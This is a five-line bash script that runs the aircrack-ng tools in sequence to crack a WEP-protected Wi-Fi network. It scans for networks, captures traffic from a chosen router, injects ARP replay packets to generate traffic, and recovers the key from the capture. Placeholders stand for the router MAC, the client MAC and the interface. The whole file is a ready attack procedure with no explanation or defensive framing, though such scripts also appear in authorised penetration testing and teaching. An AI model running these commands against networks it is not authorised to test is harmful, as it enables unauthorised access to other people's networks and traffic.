#!/bin/bash
airodump-ng wlan0
airodump-ng --bssid <routerMAC> -c 1 -w WEPcrack <interface>
aireplay-ng -3 -b <routerMAC> -h <clientMAC> <interface> -x 1024
aircrack-ng WEPcrack.cap